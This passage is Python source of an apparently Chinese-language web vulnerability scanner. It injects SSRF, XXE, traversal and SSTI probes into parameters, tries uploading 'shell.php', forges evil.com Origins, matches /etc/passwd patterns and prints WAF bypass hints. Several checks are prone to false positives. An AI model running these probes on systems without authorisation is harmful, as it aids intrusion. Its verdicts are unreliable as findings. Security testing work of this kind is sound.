            "document", "folder", "root", "feed", "host", "site",
            "html", "download", "upload", "proxy", "request",
            "webhook", "hook", "endpoint", "api", "service",
        ]

        parsed = urlparse(target)
        if parsed.query:
            params = parsed.query.split("&")
            for param in params:
                if "=" in param:
                    key, value = param.split("=", 1)
                    # 检查参数名是否在SSRF关注列表中
                    param_name = key.lower()
                    if any(sp in param_name for sp in ssrf_params):
                        for payload in self.SSRF_PAYLOADS[:10]:
                            try:
                                injected_url = target.replace(
                                    f"{key}={value}",
                                    f"{key}={requests.utils.quote(payload)}"
                                )
                                response = self._send_request(injected_url, allow_redirects=False)
                                if not response:
                                    continue

                                # SSRF检测指标
                                ssrf_indicators = [
                                    r"ECONNREFUSED",
                                    r"Connection refused",
                                    r"Connection timed out",
                                    r"couldn't connect to host",
                                    r"Name or service not known",
                                    r"Failed to connect",
                                    r"Network is unreachable",
                                    r"file_get_contents",
                                    r"curl_exec",
                                    r"curl_error",
                                    r"allow_url_fopen",
                                    r"root:.*:0:0:",
                                    r"localhost",
                                    r"127\.0\.0\.1",
                                    r"redis",
                                    r"mongodb",
                                ]

                                if self._check_response_content(response, ssrf_indicators):
                                    msg = f"[SSRF] 参数 '{key}' 可能存在SSRF! Payload: {payload}"
                                    print_success(msg)
                                    results["vulnerable"] = True
                                    results["details"].append({
                                        "parameter": key,
                                        "payload": payload,
                                        "type": "ssrf",
                                        "url": injected_url,
                                    })
                                    break

                            except Exception:
                                continue

        if not results["vulnerable"]:
            print_info("未检测到SSRF漏洞")

        self.results["ssrf"] = results
        return results

    # ==================== 8. 开放重定向检测 ====================

    def check_open_redirect(self, url=None):
        """开放重定向检测"""
        target = url or self.url
        print_section("开放重定向检测")
        results = {"vulnerable": False, "details": [], "url": target}

        if not target:
            print_error("未提供目标URL")
            return results

        print_info(f"目标: {target}")

        # 常见重定向参数
        redirect_params = [
            "redirect", "redirect_uri", "redirect_url", "redirect_to",
            "return", "return_to", "return_url", "rurl", "ru",
            "next", "url", "uri", "path", "dest", "destination",
            "target", "go", "goto", "out", "view", "site",
            "link", "href", "ref", "referer", "referrer",
            "callback", "cb", "continue", "cont", "forward",
            "forward_to", "to", "logout", "login", "domain",
        ]

        parsed = urlparse(target)
        if parsed.query:
            params = parsed.query.split("&")
            for param in params:
                if "=" in param:
                    key, value = param.split("=", 1)
                    param_name = key.lower()
                    if any(rp in param_name for rp in redirect_params):
                        for payload in self.OPEN_REDIRECT_PAYLOADS:
                            try:
                                injected_url = target.replace(
                                    f"{key}={value}",
                                    f"{key}={requests.utils.quote(payload)}"
                                )
                                response = self._send_request(injected_url, allow_redirects=False)
                                if not response:
                                    continue

                                # 检查302重定向到外部URL
                                if response.status_code in [301, 302, 303, 307, 308]:
                                    location = response.headers.get("Location", "")
                                    if any(evil in location for evil in ["evil.com", "//evil"]):
                                        msg = f"[开放重定向] 参数 '{key}' 存在开放重定向! Payload: {payload}"
                                        print_success(msg)
                                        results["vulnerable"] = True
                                        results["details"].append({
                                            "parameter": key,
                                            "payload": payload,
                                            "redirect_to": location,
                                            "status_code": response.status_code,
                                            "url": injected_url,
                                        })
                                        break

                                    # 也检测javascript/data协议
                                    if location.startswith("javascript:") or location.startswith("data:"):
                                        print_warning(f"[开放重定向] 参数 '{key}' 重定向到特殊协议: {location[:50]}")
                                        results["vulnerable"] = True
                                        results["details"].append({
                                            "parameter": key,
                                            "payload": payload,
                                            "redirect_to": location,
                                            "status_code": response.status_code,
                                            "url": injected_url,
                                        })
                                        break

                            except Exception:
                                continue

        if not results["vulnerable"]:
            print_info("未检测到开放重定向漏洞")

        self.results["open_redirect"] = results
        return results

    # ==================== 9. XXE检测 ====================

    def check_xxe(self, url=None):
        """XXE注入检测"""
        target = url or self.url
        print_section("XXE (XML外部实体注入) 检测")
        results = {"vulnerable": False, "details": [], "url": target}

        if not target:
            print_error("未提供目标URL")
            return results

        print_info(f"目标: {target}")

        # 检测接收XML的Content-Type
        try:
            headers = {"Content-Type": "application/xml"}
            for payload in self.XXE_PAYLOADS:
                try:
                    response = self._send_request(
                        target,
                        method="POST",
                        data=payload,
                        headers=headers,
                    )
                    if not response:
                        continue

                    # XXE检测: 读取文件内容回显
                    xxe_indicators = [
                        r"root:.*:0:0:",           # /etc/passwd
                        r"daemon:.*:1:1:",
                        r"bin:.*:2:2:",
                        r"127\.0\.0\.1\s+localhost",
                        r"::1\s+localhost",
                        r"\[fonts\]",
                        r"\[extensions\]",
                        r"root:x:0:0:root",
                        r"PGh0bWw+",               # base64 HTML
                        r"allow_url_fopen",
                        r"simplexml_load_string",
                        r"DOMDocument",
                        r"SimpleXMLElement",
                        r"LIBXML_NOENT",
                        r"ENTITY",
                        r"DOCTYPE",
                    ]

                    if self._check_response_content(response, xxe_indicators):
                        msg = f"[XXE] 存在XXE注入漏洞! Payload: {payload[:80]}..."
                        print_success(msg)
                        results["vulnerable"] = True
                        results["details"].append({
                            "payload": payload[:100],
                            "type": "xxe",
                            "url": target,
                        })
                        break

                except Exception:
                    continue

        except Exception as e:
            print_error(f"XXE检测出错: {e}")

        if not results["vulnerable"]:
            print_info("未检测到XXE漏洞")

        self.results["xxe"] = results
        return results

    # ==================== 10. 路径遍历检测 ====================

    def check_path_traversal(self, url=None):
        """路径遍历检测"""
        target = url or self.url
        print_section("路径遍历检测")
        results = {"vulnerable": False, "details": [], "url": target}

        if not target:
            print_error("未提供目标URL")
            return results

        print_info(f"目标: {target}")

        # 检测文件读取参数
        file_params = [
            "file", "files", "filename", "filepath", "file_path",
            "path", "dir", "directory", "folder", "cat",
            "show", "view", "page", "load", "read", "open",
            "include", "template", "document", "doc", "img",
            "image", "icon", "log", "config", "conf",
            "backup", "db", "data", "logfile", "tmp",
            "pdf", "download", "attachment", "resume", "upload",
        ]

        parsed = urlparse(target)
        if parsed.query:
            params = parsed.query.split("&")
            for param in params:
                if "=" in param:
                    key, value = param.split("=", 1)
                    param_name = key.lower()
                    if any(fp in param_name for fp in file_params):
                        for payload in self.PATH_TRAVERSAL_PAYLOADS:
                            try:
                                injected_url = target.replace(
                                    f"{key}={value}",
                                    f"{key}={requests.utils.quote(payload)}"
                                )
                                response = self._send_request(injected_url)
                                if not response:
                                    continue

                                path_indicators = [
                                    r"root:.*:0:0:",
                                    r"daemon:.*:1:1:",
                                    r"bin:.*:2:2:",
                                    r"nobody:x:",
                                    r"www-data:x:",
                                    r"127\.0\.0\.1\s+localhost",
                                    r"::1\s+localhost",
                                    r"\[fonts\]",
                                    r"\[extensions\]",
                                    r"\[Mail\]",
                                    r"UID=",
                                    r"GID=",
                                    r"HOME=",
                                    r"USER=",
                                    r"LOGNAME=",
                                    r"root:\$1\$",
                                    r"root:\$6\$",
                                    r"root:\$5\$",
                                    r"root:\$y\$",
                                    r"root:!:",
                                    r"root:.*:0:0:",
                                ]

                                if self._check_response_content(response, path_indicators):
                                    msg = f"[路径遍历] 参数 '{key}' 存在路径遍历! Payload: {payload}"
                                    print_success(msg)
                                    results["vulnerable"] = True
                                    results["details"].append({
                                        "parameter": key,
                                        "payload": payload,
                                        "type": "path_traversal",
                                        "url": injected_url,
                                    })
                                    break

                            except Exception:
                                continue

        if not results["vulnerable"]:
            print_info("未检测到路径遍历漏洞")

        self.results["path_traversal"] = results
        return results

    # ==================== 11. 文件上传漏洞检测 ====================

    def check_file_upload(self, url=None):
        """文件上传漏洞检测"""
        target = url or self.url
        print_section("文件上传漏洞检测")
        results = {"vulnerable": False, "details": [], "url": target}

        if not target:
            print_error("未提供目标URL")
            return results

        print_info(f"目标: {target}")

        # 查找上传表单
        try:
            response = self._send_request(target)
            if not response:
                return results

            html = response.text

            # 查找文件上传表单
            upload_forms = re.findall(
                r'<form[^>]*enctype=["\']multipart/form-data["\'][^>]*>.*?</form>',
                html,
                re.IGNORECASE | re.DOTALL
            )

            if not upload_forms:
                # 更宽松的匹配
                upload_forms = re.findall(
                    r'<input[^>]*type=["\']file["\'][^>]*>',
                    html,
                    re.IGNORECASE
                )

            if upload_forms:
                print_info(f"找到 {len(upload_forms)} 个上传入口")

                # 查找上传URL
                upload_urls = re.findall(
                    r'<form[^>]*action=["\'](.*?)["\'][^>]*enctype=["\']multipart/form-data["\']',
                    html,
                    re.IGNORECASE
                )
                upload_urls += re.findall(
                    r'<form[^>]*enctype=["\']multipart/form-data["\'][^>]*action=["\'](.*?)["\']',
                    html,
                    re.IGNORECASE
                )

                if not upload_urls:
                    # 查找常见上传端点
                    upload_urls = ["/upload", "/upload.php", "/upload.jsp",
                                   "/upload.aspx", "/file/upload", "/api/upload"]

                # 检查文件上传限制
                for upload_path in upload_urls:
                    if not upload_path.startswith("http"):
                        parsed = urlparse(target)
                        base = f"{parsed.scheme}://{parsed.netloc}"
                        if upload_path.startswith("/"):
                            upload_url = base + upload_path
                        else:
                            upload_url = base + "/" + upload_path
                    else:
                        upload_url = upload_path

                    # 尝试上传PHP文件
                    test_content = "<?php phpinfo(); ?>"
                    for filename in ["test.php", "shell.php", "test.php5", "test.phtml"]:
                        try:
                            files = {
                                "file": (filename, test_content, "application/x-php"),
                                "upload": (None, "Submit"),
                            }
                            resp = self._send_request(
                                upload_url,
                                method="POST",
                                data=None,
                            )

                            # 也用multipart方式尝试
                            resp2 = None
                            try:
                                resp2 = self.session.request(
                                    "POST",
                                    upload_url,
                                    files=files,
                                    headers=self.headers,
                                    timeout=self.timeout,
                                    verify=self.verify_ssl,
                                    proxies=self.proxies,
                                )
                            except Exception:
                                pass

                            for res in [resp, resp2]:
                                if res:
                                    upload_success = [
                                        r"uploaded",
                                        r"success",
                                        r"OK",
                                        r"done",
                                        r"upload complete",
                                        r"file has been",
                                        r"move_uploaded_file",
                                        r"copy",
                                        r"UPLOAD",
                                        r"HTTP/1\.1 200",
                                        r"tmp_name",
                                        r"stored in",
                                        r"保存成功",
                                        r"上传成功",
                                    ]

                                    if self._check_response_content(res, upload_success):
                                        msg = f"[文件上传] 可能允许上传可执行文件: {filename} -> {upload_url}"
                                        print_warning(msg)
                                        results["vulnerable"] = True
                                        results["details"].append({
                                            "url": upload_url,
                                            "filename": filename,
                                            "type": "file_upload",
                                        })
                                        break

                        except Exception:
                            continue

            else:
                print_info("未找到文件上传入口")

        except Exception as e:
            print_error(f"文件上传检测出错: {e}")

        if not results["vulnerable"]:
            print_info("未检测到文件上传漏洞")

        self.results["file_upload"] = results
        return results

    # ==================== 12. 点击劫持检测 ====================

    def check_clickjacking(self, url=None):
        """点击劫持检测 - X-Frame-Options头"""
        target = url or self.url
        print_section("点击劫持 (Clickjacking) 检测")
        results = {"vulnerable": False, "details": [], "url": target}

        if not target:
            print_error("未提供目标URL")
            return results

        print_info(f"目标: {target}")

        try:
            response = self._send_request(target, method="GET")
            if not response:
                return results

            # 检查X-Frame-Options头
            xfo = response.headers.get("X-Frame-Options", "")
            csp = response.headers.get("Content-Security-Policy", "")

            print_info(f"X-Frame-Options: {xfo or '未设置'}")
            print_info(f"Content-Security-Policy: {csp[:100] if csp else '未设置'}")

            has_xfo = bool(xfo)
            has_csp_frame = "frame-ancestors" in csp if csp else False

            if not has_xfo and not has_csp_frame:
                msg = "[点击劫持] 缺少X-Frame-Options头和CSP frame-ancestors，可能存在点击劫持风险"
                print_warning(msg)
                results["vulnerable"] = True
                results["details"].append({
                    "missing_xfo": True,
                    "missing_csp_frame_ancestors": True,
                    "xfo": xfo,
                    "csp": csp[:200] if csp else "",
                })
            elif not has_xfo:
                print_warning("X-Frame-Options头缺失，但CSP中设置了frame-ancestors")
                results["details"].append({
                    "missing_xfo": True,
                    "missing_csp_frame_ancestors": False,
                    "csp": csp[:200] if csp else "",
                })
            elif not has_csp_frame:
                print_info("X-Frame-Options已设置，点击劫持风险较低")
                results["details"].append({
                    "missing_xfo": False,
                    "xfo": xfo,
                })
            else:
                print_info("X-Frame-Options和CSP均已设置，点击劫持防护良好")

        except Exception as e:
            print_error(f"点击劫持检测出错: {e}")

        self.results["clickjacking"] = results
        return results

    # ==================== 13. SSTI检测 ====================

    def check_ssti(self, url=None):
        """服务端模板注入检测"""
        target = url or self.url
        print_section("SSTI (服务端模板注入) 检测")
        results = {"vulnerable": False, "details": [], "url": target}

        if not target:
            print_error("未提供目标URL")
            return results

        print_info(f"目标: {target}")

        # 检测SSTI的数学运算结果
        # {{7*7}} 应该返回 49 或包含49的字符串
        math_patterns = [
            (r"49", "{{7*7}}"),
            (r"7777777", "{{'7'*7}}"),
        ]

        parsed = urlparse(target)
        if parsed.query:
            params = parsed.query.split("&")
            for param in params:
                if "=" in param:
                    key, value = param.split("=", 1)
                    for payload in self.SSTI_PAYLOADS:
                        try:
                            injected_url = target.replace(
                                f"{key}={value}",
                                f"{key}={requests.utils.quote(payload)}"
                            )
                            response = self._send_request(injected_url)
                            if not response:
                                continue

                            # 检测模板注入特征
                            ssti_indicators = [
                                r"49",                          # 7*7的结果
                                r"7777777",                     # '7'*7的结果
                                r"<class '",                    # 对象信息泄露
                                r"__mro__",
                                r"__subclasses__",
                                r"__globals__",
                                r"__class__",
                                r"__init__",
                                r"os\.popen",
                                r"subprocess",
                                r"<built-in",
                                r"<module",
                                r"<type",
                                r"self",
                                r"config",
                                r"TemplateAssertionError",
                                r"TemplateError",
                                r"jinja2",
                                r"twig",
                                r"smarty",
                                r"freemarker",
                                r"velocity",
                                r"mako",
                                r"TemplateSyntaxError",
                                r"UndefinedError",
                            ]

                            if self._check_response_content(response, ssti_indicators):
                                msg = f"[SSTI] 参数 '{key}' 可能存在模板注入! Payload: {payload}"
                                print_success(msg)
                                results["vulnerable"] = True
                                results["details"].append({
                                    "parameter": key,
                                    "payload": payload,
                                    "type": "ssti",
                                    "url": injected_url,
                                })
                                break

                        except Exception:
                            continue

        if not results["vulnerable"]:
            print_info("未检测到SSTI漏洞")

        self.results["ssti"] = results
        return results

    # ==================== 14. CORS配置错误检测 ====================

    def check_cors(self, url=None):
        """CORS配置错误检测"""
        target = url or self.url
        print_section("CORS配置错误检测")
        results = {"vulnerable": False, "details": [], "url": target}

        if not target:
            print_error("未提供目标URL")
            return results

        print_info(f"目标: {target}")

        # 测试不同的Origin
        test_origins = [
            "https://evil.com",
            "https://evilsite.com",
            "null",
            "http://evil.com",
            "https://evil.com.evil.com",
            "https://evil.com:8080",
            "http://127.0.0.1",
            "http://localhost",
            "https://company.com.attacker.com",
            "https://sub-company.com",
        ]

        for origin in test_origins:
            try:
                headers = {"Origin": origin}
                response = self._send_request(target, headers=headers)
                if not response:
                    continue

                acao = response.headers.get("Access-Control-Allow-Origin", "")
                acac = response.headers.get("Access-Control-Allow-Credentials", "")

                if acao:
                    print_info(f"Origin: {origin} -> ACAO: {acao}, ACAC: {acac}")

                    # 检查是否反射了Origin
                    if acao == origin or acao == "*":
                        if acac == "true" and acao != "*":
                            msg = f"[CORS] 配置错误! 反射Origin且允许凭据: {origin}"
                            print_success(msg)
                            results["vulnerable"] = True
                            results["details"].append({
                                "origin": origin,
                                "acao": acao,
                                "acac": acac,
                                "risk": "high",
                                "url": target,
                            })
                        elif acao == "*":
                            msg = f"[CORS] 通配符Origin: {origin} (ACAO: *)"
                            print_warning(msg)
                            results["vulnerable"] = True
                            results["details"].append({
                                "origin": origin,
                                "acao": acao,
                                "acac": acac,
                                "risk": "medium",
                                "url": target,
                            })
                        else:
                            msg = f"[CORS] 反射Origin: {origin} -> {acao}"
                            print_warning(msg)
                            results["vulnerable"] = True
                            results["details"].append({
                                "origin": origin,
                                "acao": acao,
                                "acac": acac,
                                "risk": "medium",
                                "url": target,
                            })

            except Exception:
                continue

        if not results["vulnerable"]:
            print_info("未检测到CORS配置错误")

        self.results["cors"] = results
        return results

    # ==================== 15. 目录列表检测 ====================

    def check_directory_listing(self, url=None):
        """目录列表检测"""
        target = url or self.url
        print_section("目录列表 (Directory Listing) 检测")
        results = {"vulnerable": False, "details": [], "url": target}

        if not target:
            print_error("未提供目标URL")
            return results

        print_info(f"目标: {target}")

        # 常见目录
        common_dirs = [
            "/", "/admin", "/backup", "/backups", "/bak", "/css",
            "/js", "/images", "/img", "/assets", "/static",
            "/uploads", "/upload", "/files", "/data", "/logs",
            "/log", "/tmp", "/temp", "/download", "/downloads",
            "/includes", "/include", "/lib", "/libs", "/src",
            "/source", "/test", "/tests", "/testing", "/demo",
            "/sql", "/database", "/db", "/config", "/configuration",
            "/private", "/secure", "/api", "/v1", "/v2",
            "/.git", "/.svn", "/.hg", "/.env", "/.DS_Store",
            "/wp-content", "/wp-admin", "/wp-includes",
            "/vendor", "/node_modules", "/bower_components",
            "/phpmyadmin", "/phpPgAdmin", "/adminer",
            "/cgi-bin", "/cgi", "/icons", "/%2e%2e",
            "/phpinfo.php", "/info.php", "/test.php",
            "/server-status", "/server-info",
        ]

        for directory in common_dirs:
            try:
                if not target.endswith("/") and not directory.startswith("/"):
                    directory = "/" + directory

                # 拼接URL
                if directory.startswith("/"):
                    parsed = urlparse(target)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{directory}"
                else:
                    test_url = target.rstrip("/") + "/" + directory.lstrip("/")

                response = self._send_request(test_url)
                if not response:
                    continue

                if response.status_code == 200:
                    # 检测目录列表特征
                    listing_indicators = [
                        r"Index of /",
                        r"<title>Index of",
                        r"<h1>Directory listing",
                        r"<h1>Index of",
                        r"Parent Directory</a>",
                        r"parent directory</a>",
                        r"\[DIR\]",
                        r"\[FILE\]",
                        r"Directory:",
                        r"<pre>",
                        r"<a href=\"\?C=",
                        r"<a href=\"\?N=",
                        r"<a href=\"\?M=",
                        r"<a href=\"\?S=",
                        r"<table.*>.*<tr>.*<th>.*Name.*</th>",
                        r"Apache.*Server at",
                        r"nginx.*directory index",
                        r"lighttpd.*directory",
                        r"IIS.*directory",
                        r"Last modified",
                        r"<img src=\"/icons/",
                        r"<img src=\"/icons/back.gif",
                        r"<img src=\"/icons/blank.gif",
                        r"<img src=\"/icons/folder.gif",
                        r"<img src=\"/icons/text.gif",
                        r"<img src=\"/icons/unknown.gif",
                    ]

                    if self._check_response_content(response, listing_indicators):
                        msg = f"[目录列表] 目录列表开启: {test_url}"
                        print_success(msg)
                        results["vulnerable"] = True
                        results["details"].append({
                            "url": test_url,
                            "type": "directory_listing",
                        })
                    else:
                        # 响应是200但没目录列表特征，记录一下
                        if len(response.text) > 100 and response.text.strip():
                            print_info(f"目录可访问: {test_url} (200 OK, 内容未知)")

                elif response.status_code == 403:
                    print_info(f"目录存在但禁止访问: {test_url} (403 Forbidden)")

                elif response.status_code == 401:
                    print_info(f"目录需要认证: {test_url} (401 Unauthorized)")

            except Exception:
                continue

        if not results["vulnerable"]:
            print_info("未检测到目录列表漏洞")

        self.results["directory_listing"] = results
        return results

    # ==================== 16. HTTP方法枚举 ====================

    def check_http_methods(self, url=None):
        """HTTP方法枚举"""
        target = url or self.url
        print_section("HTTP方法枚举")
        results = {"vulnerable": False, "details": [], "url": target}

        if not target:
            print_error("未提供目标URL")
            return results

        print_info(f"目标: {target}")

        # 先尝试OPTIONS
        try:
            options_resp = self._send_request(target, method="OPTIONS")
            if options_resp:
                allow_header = options_resp.headers.get("Allow", "")
                public_header = options_resp.headers.get("Public", "")

                if allow_header:
                    allowed_methods = [m.strip() for m in allow_header.split(",")]
                    print_info(f"Allow: {', '.join(allowed_methods)}")
                else:
                    allowed_methods = []
                    print_info("Allow头不存在")

                if public_header:
                    public_methods = [m.strip() for m in public_header.split(",")]
                    print_info(f"Public: {', '.join(public_methods)}")
                else:
                    public_methods = []

                # 合并允许的方法
                all_allowed = list(set(allowed_methods + public_methods))

                # 检查危险方法
                dangerous_methods = {
                    "PUT": "可能导致文件上传",
                    "DELETE": "可能导致文件删除",
                    "TRACE": "可能导致XST攻击",
                    "CONNECT": "可能被用作代理",
                    "PROPFIND": "WebDAV信息泄露",
                    "PROPPATCH": "WebDAV修改属性",
                    "MKCOL": "WebDAV创建目录",
                    "COPY": "WebDAV复制文件",
                    "MOVE": "WebDAV移动文件",
                    "LOCK": "WebDAV锁定文件",
                    "UNLOCK": "WebDAV解锁文件",
                    "PATCH": "部分更新",
                    "SEARCH": "WebDAV搜索",
                    "MKCALENDAR": "CalDAV创建日历",
                    "ACL": "WebDAV ACL管理",
                    "REPORT": "WebDAV报告",
                    "LINK": "创建链接",
                    "UNLINK": "删除链接",
                }

                dangerous_found = []
                for method in all_allowed:
                    method_upper = method.upper()
                    if method_upper in dangerous_methods:
                        dangerous_found.append((method_upper, dangerous_methods[method_upper]))

                if dangerous_found:
                    results["vulnerable"] = True
                    for method, desc in dangerous_found:
                        msg = f"[HTTP方法] 危险方法 '{method}' 已启用 - {desc}"
                        print_warning(msg)
                        results["details"].append({
                            "method": method,
                            "description": desc,
                            "type": "dangerous_method",
                        })

                if not all_allowed:
                    all_allowed = ["GET", "HEAD", "POST"]

            else:
                all_allowed = ["GET", "HEAD", "POST"]

        except Exception as e:
            print_error(f"OPTIONS请求失败: {e}")
            all_allowed = ["GET", "HEAD", "POST"]

        # 逐一测试方法
        print_info("逐一测试HTTP方法...")
        for method in self.HTTP_METHODS:
            try:
                resp = self._send_request(target, method=method)
                if resp:
                    # 200, 405 表示方法被识别
                    if resp.status_code not in [405, 501, 400]:
                        if resp.status_code == 200:
                            print_info(f"  {method}: {resp.status_code} (被允许)")
                        elif resp.status_code in [401, 403]:
                            print_info(f"  {method}: {resp.status_code} (被允许但需要认证)")
                        elif resp.status_code in [302, 303, 307]:
                            print_info(f"  {method}: {resp.status_code} (被允许，重定向)")
                        else:
                            print_info(f"  {method}: {resp.status_code}")
                    elif resp.status_code == 405:
                        pass  # 方法不允许，正常

            except Exception:
                continue

        if not results["vulnerable"]:
            print_info("未发现危险HTTP方法")

        self.results["http_methods"] = results
        return results

    # ==================== 17. WAF检测 ====================

    def check_waf(self, url=None):
        """WAF (Web应用防火墙) 检测"""
        target = url or self.url
        print_section("WAF (Web应用防火墙) 检测")
        results = {"vulnerable": False, "details": [], "url": target}

        if not target:
            print_error("未提供目标URL")
            return results

        print_info(f"目标: {target}")

        # 先发送正常请求获取基线
        try:
            normal_response = self._send_request(target)
            if not normal_response:
                return results

            normal_status = normal_response.status_code
            normal_length = len(normal_response.text)
            normal_headers = dict(normal_response.headers)

            print_info(f"正常响应: 状态码={normal_status}, 大小={normal_length}字节")

            # 发送恶意请求检测WAF
            waf_identified = None
            detected_wafs = []

            for payload in self.WAF_DETECTION_PAYLOADS:
                try:
                    parsed = urlparse(target)
                    if parsed.query:
                        params = parsed.query.split("&")
                        test_url = target
                        if params:
                            key, value = params[0].split("=", 1)
                            test_url = target.replace(
                                f"{key}={value}",
                                f"{key}={requests.utils.quote(payload)}"
                            )
                    else:
                        # 无参数，在URL后添加测试参数
                        if "?" in target:
                            test_url = f"{target}&waf={requests.utils.quote(payload)}"
                        else:
                            test_url = f"{target}?waf={requests.utils.quote(payload)}"

                    attack_response = self._send_request(test_url)
                    if not attack_response:
                        continue

                    # WAF检测指标
                    waf_indicators = [
                        # 状态码变化
                        attack_response.status_code in [406, 501, 403, 429, 503, 400, 412, 444, 499],
                        # 响应长度显著变化
                        abs(len(attack_response.text) - normal_length) < 100,
                        # 响应头包含WAF标识
                        bool(re.search(r'(cloudflare|mod_security|modsecurity|webknight|sucuri|'
                                       r'incapsula|akamai|aws|waf|barracuda|fortinet|'
                                       r'f5|bigip|paloalto|comodo|siteground|stackpath|'
                                       r'blocked|denied|rejected|forbidden|challenge|'
                                       r'captcha|security)', str(attack_response.headers), re.IGNORECASE)),
                        # 响应体包含WAF标识
                        bool(re.search(r'(cloudflare|mod_security|modsecurity|webknight|sucuri|'
                                       r'incapsula|akamai|waf|blocked|denied|rejected|'
                                       r'forbidden|illegal|malicious|attack|suspicious|'
                                       r'security|challenge|access denied|your request|'
                                       r'has been blocked|please try again|'
                                       r'request rejected)', attack_response.text, re.IGNORECASE)),
                    ]

                    if any(waf_indicators):
                        # 识别具体WAF
                        waf_signatures = {
                            "Cloudflare": [
                                r"cloudflare", r"__cfduid", r"cf-ray",
                                r"cf-cache-status", r"CF-RAY",
                            ],
                            "ModSecurity": [
                                r"mod_security", r"modsecurity", r"ModSecurity",
                            ],
                            "AWS WAF": [
                                r"awselb", r"aws-waf", r"x-amzn-RequestId",
                                r"x-amzn-ErrorType",
                            ],
                            "F5 BIG-IP": [
                                r"BigIP", r"F5", r"TS[a-f0-9]{6,}",
                            ],
                            "Akamai": [
                                r"akamai", r"akamaidownload", r"X-Akamai",
                            ],
                            "Sucuri": [
                                r"sucuri", r"X-Sucuri",
                            ],
                            "Incapsula": [
                                r"incapsula", r"X-Iinfo",
                            ],
                            "Barracuda": [
                                r"barracuda", r"Barracuda",
                            ],
                            "Comodo": [
                                r"comodo", r"COMODO",
                            ],
                            "WebKnight": [
                                r"webknight", r"WebKnight",
                            ],
                            "FortiWeb": [
                                r"fortiweb", r"FortiWeb", r"Fortinet",
                            ],
                            "Palo Alto": [
                                r"paloalto", r"PANW",
                            ],
                            "StackPath": [
                                r"stackpath", r"StackPath",
                            ],
                            "SafeLine": [
                                r"safeline", r"SafeLine",
                            ],
                            "CrawlProtect": [
                                r"crawlprotect", r"CrawlProtect",
                            ],
                            "阿里云WAF": [
                                r"aliyun", r"waf.aliyun", r"YUNDUN",
                            ],
                            "腾讯云WAF": [
                                r"tencent", r"tlscdn", r"txwaf",
                            ],
                            "华为云WAF": [
                                r"huawei", r"hwclouds",
                            ],
                            "百度云WAF": [
                                r"baidu", r"yunjiasu",
                            ],
                            "360网站卫士": [
                                r"360waf", r"360网站卫士",
                            ],
                            "知道创宇": [
                                r"knownsec", r"创宇云",
                            ],
                            "长亭SafeLine": [
                                r"chaitin", r"safeline",
                            ],
                        }

                        for waf_name, signatures in waf_signatures.items():
                            if self._check_response_content(attack_response, signatures):
                                if waf_name not in detected_wafs:
                                    detected_wafs.append(waf_name)
                                break

                        if not waf_identified:
                            # 通用检测
                            if attack_response.status_code in [406, 501, 412]:
                                waf_identified = "Generic WAF (基于状态码)"
                            elif attack_response.status_code in [403, 429, 503]:
                                waf_identified = "Generic WAF (访问被拒绝)"

                except Exception:
                    continue

            if detected_wafs:
                msg = f"[WAF] 检测到WAF: {', '.join(detected_wafs)}"
                print_success(msg)
                results["waf_detected"] = True
                results["details"].append({
                    "waf_names": detected_wafs,
                    "type": "waf",
                })

                # 检查是否可绕过
                print_info("检测到的WAF可能以下列方式绕过:")
                bypass_notes = {
                    "Cloudflare": "尝试使用真实IP源站绕过",
                    "ModSecurity": "尝试使用规则绕过技术",
                    "AWS WAF": "尝试大小写混淆",
                    "阿里云WAF": "尝试编码绕过",
                    "腾讯云WAF": "尝试分块传输",
                }
                for waf in detected_wafs:
                    if waf in bypass_notes:
                        print_info(f"  {waf}: {bypass_notes[waf]}")
            else:
                print_info("未检测到WAF")

        except Exception as e:
            print_error(f"WAF检测出错: {e}")

        self.results["waf"] = results
        return results

    # ==================== 18. 全量扫描 ====================

    def scan_all(self, url=None):
        """全量扫描 - 调用所有检测方法"""
        target = url or self.url
        print_section("全量漏洞扫描")
        print_info(f"目标: {target}")
        print_info("开始执行全部18项检测...\n")

        if not target:
            print_error("未提供目标URL")
            return {}

        checks = [
            ("WAF检测", self.check_waf),
            ("HTTP方法枚举", self.check_http_methods),
            ("目录列表检测", self.check_directory_listing),
            ("点击劫持检测", self.check_clickjacking),
            ("CORS配置错误检测", self.check_cors),
            ("CSRF漏洞检测", self.check_csrf),
            ("SQL注入检测", self.check_sql_injection),
            ("XSS检测", self.check_xss),
            ("LFI检测", self.check_lfi),
            ("RFI检测", self.check_rfi),
            ("命令注入检测", self.check_command_injection),
            ("SSRF检测", self.check_ssrf),
            ("开放重定向检测", self.check_open_redirect),
            ("XXE注入检测", self.check_xxe),
            ("路径遍历检测", self.check_path_traversal),
            ("文件上传漏洞检测", self.check_file_upload),
            ("SSTI检测", self.check_ssti),
        ]

        total = len(checks)
        progress = ProgressBar(total, prefix="扫描进度", length=50)

        for name, check_func in checks:
            print_info(f"正在执行: {name}")
            try:
                check_func(target)
            except Exception as e:
                msg = f"[{name}] 检测异常: {e}"
                print_error(msg)
                self.results[name] = {"error": str(e)}
            progress.update()

        # 汇总结果
        print_section("扫描结果汇总")

        vuln_count = 0
        total_checks = 0
        vulnerable_items = []

        for check_name, result in self.results.items():
            if isinstance(result, dict):
                total_checks += 1
                if result.get("vulnerable"):
                    vuln_count += 1
                    details = result.get("details", [])
                    if details:
                        for detail in details[:2]:  # 最多显示2个
                            vulnerable_items.append((check_name, detail))

        print_table(
            ["检测项", "状态"],
            [
                (name, f"{Colors.GREEN}有风险{Colors.RESET}" if
                 isinstance(self.results.get(name), dict) and
                 self.results[name].get("vulnerable")
                 else f"{Colors.BLUE}安全{Colors.RESET}")
                for name in self.results
                if isinstance(self.results.get(name), dict)
            ],
            color=Colors.CYAN,
        )

        print(f"\n{Colors.BOLD}扫描完成!{Colors.RESET}")
        print(f"  总检测项: {total_checks}")
        print(f"  发现漏洞: {Colors.RED if vuln_count > 0 else Colors.GREEN}{vuln_count}{Colors.RESET}")
        print(f"  安全项: {Colors.GREEN}{total_checks - vuln_count}{Colors.RESET}")

        if vulnerable_items:
            print(f"\n{Colors.BOLD}{Colors.RED}发现的主要漏洞:{Colors.RESET}")
            for check_name, detail in vulnerable_items:
                param = detail.get("parameter", detail.get("method", detail.get("url", "")))
                print(f"  {Colors.RED}[!]{Colors.RESET} {check_name}: {param}")

        return self.results